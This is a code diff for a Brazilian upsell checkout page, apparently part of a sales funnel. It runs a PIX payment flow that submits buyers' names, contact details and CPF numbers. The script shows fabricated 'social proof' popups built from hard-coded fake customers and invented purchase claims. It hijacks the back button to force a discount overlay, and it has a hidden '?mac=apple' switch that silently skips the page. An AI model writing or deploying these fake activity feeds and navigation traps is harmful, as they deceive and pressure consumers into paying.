+    {name:'Ana C.',city:'BH'},{name:'Joao P.',city:'SP'},
+    {name:'Maria L.',city:'RJ'},{name:'Carlos S.',city:'Curitiba'},
+    {name:'Fernanda D.',city:'Salvador'},{name:'Rafael T.',city:'BSB'}
+];
+const spActions = ['emitiu a NF-e agora','garantiu nota fiscal ha 1 min','liberou o envio com NF-e'];
+let proofIdx = 0;
+function startSocialProof() {
+    setTimeout(() => showProof(), 5000);
+    setInterval(() => showProof(), 13000);
+}
+function showProof() {
+    const p = proofs[proofIdx % proofs.length];
+    const a = spActions[Math.floor(Math.random() * spActions.length)];
+    document.getElementById('spText').innerHTML = `<strong>${p.name}</strong> de ${p.city} ${a}`;
+    document.getElementById('socialProof').classList.add('show');
+    setTimeout(() => document.getElementById('socialProof').classList.remove('show'), 5000);
+    proofIdx++;
+}
+
+// PIX
+async function generatePix() {
+    const btn = document.getElementById('payBtn');
+    btn.classList.add('loading'); btn.disabled = true;
+    const utm = {}; utmKeys.forEach(k => { const v = localStorage.getItem(k); if(v) utm[k] = v; });
+    const ld = LeadData.load();
+    try {
+        const res = await fetch(`${API_BASE}/pix.php`, {
+            method: 'POST', headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({
+                amount: currentPrice,
+                payerName: nome || ld.nome || ld.name || 'Cliente',
+                email: params.get('email') || ld.email || '',
+                phone: params.get('telefone') || ld.telefone || ld.phone || '',
+                document: params.get('cpf') || ld.cpf || ld.document || '',
+                productName: PRODUCT_NAME, utm
+            })
+        });
+        const result = await res.json();
+        if (result.success) {
+            currentTransactionId = result.transactionId;
+            LeadData.update({upp0_transaction:result.transactionId,upp0_amount:currentPrice,upp0_timestamp:Date.now()});
+            document.getElementById('pixQrImage').src = result.qrCodeImage || '';
+            document.getElementById('pixCopyPaste').value = result.pixCopyPaste || '';
+            openPixModal(); startStatusCheck(); startPixTimer();
+        } else alert('Erro: '+(result.error||'Tente novamente'));
+    } catch(e) { console.error(e); alert('Erro de conexao.'); }
+    finally { btn.classList.remove('loading'); btn.disabled = false; }
+}
+
+function openPixModal() { document.getElementById('pixOverlay').classList.add('active'); document.body.style.overflow = 'hidden'; }
+function closePixModal() { document.getElementById('pixOverlay').classList.remove('active'); document.body.style.overflow = ''; }
+document.getElementById('pixOverlay').addEventListener('click', function(e) { if(e.target===this) closePixModal(); });
+
+function copyPixCode() {
+    const code = document.getElementById('pixCopyPaste').value;
+    if(!code) return;
+    if(navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(code).then(showCopied).catch(fallbackCopy);
+    else fallbackCopy();
+}
+function fallbackCopy() { const i=document.getElementById('pixCopyPaste'); i.select(); i.setSelectionRange(0,99999); document.execCommand('copy'); showCopied(); }
+function showCopied() { const b=document.getElementById('copyBtn'); b.textContent='Copiado!'; b.classList.add('copied'); setTimeout(()=>{b.textContent='Copiar';b.classList.remove('copied')},3000); }
+
+function startPixTimer() { pixTimerSeconds=30*60; if(pixTimerInterval)clearInterval(pixTimerInterval); pixTimerInterval=setInterval(updatePixTimer,1000); updatePixTimer(); }
+function updatePixTimer() { const m=Math.floor(pixTimerSeconds/60),s=pixTimerSeconds%60; document.getElementById('pixTimer').textContent=`${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`; if(pixTimerSeconds>0)pixTimerSeconds--;else{document.getElementById('pixTimer').textContent='EXPIRADO';clearInterval(pixTimerInterval);stopStatusCheck();}}
+
+function startStatusCheck() { if(statusCheckInterval)clearInterval(statusCheckInterval); statusCheckInterval=setInterval(checkPaymentStatus,4000); setTimeout(checkPaymentStatus,3000); }
+function stopStatusCheck() { if(statusCheckInterval){clearInterval(statusCheckInterval);statusCheckInterval=null;} }
+async function checkPaymentStatus() {
+    if(!currentTransactionId)return;
+    try { const r=await fetch(`${API_BASE}/status.php?id=${currentTransactionId}`); const d=await r.json();
+        if(d.status==='APPROVED'){stopStatusCheck();if(pixTimerInterval)clearInterval(pixTimerInterval);showPaymentApproved();}
+    } catch(e){console.error(e);}
+}
+function showPaymentApproved() {
+    document.getElementById('pixStatusIcon').className='ps-icon paid';
+    document.getElementById('pixStatusIcon').innerHTML='<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>';
+    document.getElementById('pixStatusDot').className='pix-status-dot paid';
+    document.getElementById('pixStatusText').textContent='Pagamento confirmado!';
+    document.getElementById('pixStatusDesc').textContent='Redirecionando...';
+    document.getElementById('pixStatus').style.background='rgba(52,199,89,.08)';
+    LeadData.update({upp0_paid:true,upp0_paid_at:Date.now()});
+    setTimeout(()=>window.location.href=buildUrl(NEXT_UPSELL),2500);
+}
+
+// Back redirect
+let brShown = false;
+function initBackRedirect() {
+    history.pushState(null,'',window.location.href);
+    window.addEventListener('popstate',()=>{history.pushState(null,'',window.location.href);if(!brShown)showBackRedirect();});
+}
+function handleDecline() { if(!brShown) showBackRedirect(); else goToNextUpsell(); }
+function showBackRedirect() { brShown=true; document.getElementById('brOverlay').classList.add('active'); document.body.style.overflow='hidden'; }
+function acceptDiscount() {
+    currentPrice = DISCOUNT_PRICE_CENTS;
+    const p = formatPrice(DISCOUNT_PRICE_CENTS);
+    document.getElementById('payPrice').textContent=p;
+    document.getElementById('payPriceDisplay').textContent=p;
+    document.getElementById('docPrice').textContent=p;
+    document.getElementById('fixedPrice').textContent=p;
+    document.getElementById('brOverlay').classList.remove('active');
+    document.body.style.overflow='';
+    document.querySelector('.pay-section').scrollIntoView({behavior:'smooth'});
+}
+function declineDiscount() { document.getElementById('brOverlay').classList.remove('active'); document.body.style.overflow=''; goToNextUpsell(); }
+
+function buildUrl(base, extra={}) {
+    const u=new URL(base,window.location.href);
+    new URLSearchParams(window.location.search).forEach((v,k)=>u.searchParams.set(k,v));
+    Object.entries(extra).forEach(([k,v])=>{if(v)u.searchParams.set(k,v)});
+    return u.toString();
+}
+function goToNextUpsell() { window.location.href=buildUrl(NEXT_UPSELL); }
+function formatPrice(c) { return 'R$ '+(c/100).toFixed(2).replace('.',','); }
+
+// Cookie
+document.cookie = `apple_upp_${UPSELL_ID}=visited;max-age=${30*24*60*60};path=/`;
+
+// Auto-skip mode (?mac=apple)
+if(params.get('mac')==='apple'){setTimeout(()=>{window.location.href=buildUrl(NEXT_UPSELL);},2000);}
+
+</script>
+
+
+</body></html>
